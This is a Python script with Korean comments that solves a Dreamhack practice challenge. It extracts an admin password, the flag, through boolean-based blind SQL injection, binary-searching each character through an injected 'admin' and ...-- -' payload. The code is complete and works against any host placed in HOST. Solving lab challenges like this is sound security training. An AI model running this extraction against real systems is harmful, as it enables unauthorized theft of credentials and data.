#!/usr/bin/env python3
"""
Dreamhack - Blind SQL Injection 풀이 스크립트
--------------------------------------------------
목표: admin 계정의 upw 컬럼(= FLAG)을 Boolean-based Blind SQLi로 한 글자씩 추출한다.

원리
  - 취약 쿼리: SELECT * FROM users WHERE uid='{uid}';
  - 오라클   : 결과가 1행이면 응답에 'exists.' 문구가 포함된다(참), 아니면 없다(거짓).
  - 페이로드 : admin' and <조건>-- -   (뒤의 ';는 -- - 로 주석 처리)
  - ascii(substr(upw,i,1)) 값을 이진 탐색으로 좁혀 각 글자를 알아낸다.
    (MySQL 기본 비교는 대소문자를 구분하지 않으므로 ascii 바이트 값으로 비교)
  - 문자열 끝을 지나면 substr 이 빈 문자('')를 반환하고 ascii('')=0 이 되므로
    이를 이용해 자동으로 종료한다.

안정성 보강
  - 요청마다 짧은 딜레이 + 재시도 (인스턴스 불안정/throttling 대비)
  - 시작 전 오라클 정상 동작 점검 (1=1 참, 1=2 거짓)
  - 이진 탐색으로 찾은 글자를 등호(=)로 한 번 더 확인

사용법:
  1) pip install requests
  2) HOST 를 발급받은 인스턴스 주소로 수정
  3) python solve_blind.py
"""

import sys
import time
import requests

# 발급받은 인스턴스 주소로 교체하세요 (끝에 / 없이)
HOST = "http://host3.dreamhack.games:11004"

DELAY = 0.05      # 요청 간 대기(초) - 인스턴스가 불안정하면 0.1~0.2로 늘리세요
RETRY = 3         # 요청 실패 시 재시도 횟수

session = requests.Session()


def is_true(condition: str) -> bool:
    """condition 이 참이면 결과가 1행 -> 응답에 'exists.' 가 포함된다."""
    payload = f"admin' and {condition}-- -"
    for attempt in range(RETRY):
        try:
            r = session.get(HOST + "/", params={"uid": payload}, timeout=10)
            time.sleep(DELAY)
            return "exists." in r.text
        except requests.RequestException:
            time.sleep(0.5 * (attempt + 1))
    raise RuntimeError(f"요청 실패: {condition}")


def sanity_check():
    """오라클이 제대로 동작하는지 확인한다."""
    if not is_true("1=1"):
        sys.exit("[!] 오라클 오류: 1=1 이 참으로 나오지 않음. HOST/문제 상태 확인 필요")
    if is_true("1=2"):
        sys.exit("[!] 오라클 오류: 1=2 가 거짓으로 나오지 않음. 응답 판별 기준 확인 필요")
    print("[*] 오라클 정상 (1=1 참, 1=2 거짓)")


def find_char(pos: int) -> int:
    """upw 의 pos 번째(1-base) 글자의 아스키 값을 이진 탐색으로 찾는다. 끝을 넘으면 0."""
    low, high = 0, 127          # 0(빈 문자) ~ 127
    while low < high:
        mid = (low + high) // 2
        if is_true(f"ascii(substr(upw,{pos},1))>{mid}"):
            low = mid + 1
        else:
            high = mid
    return low


def main():
    print(f"[*] target: {HOST}")
    sanity_check()

    flag = ""
    pos = 1
    while True:
        code = find_char(pos)
        if code == 0:          # 빈 문자 -> 문자열 끝
            break
        flag += chr(code)
        print(f"[+] {pos:2d} : {flag}")
        pos += 1
        if pos > 200:          # 안전장치
            break

    print(f"\n[★] FLAG = {flag}")


if __name__ == "__main__":
    main()
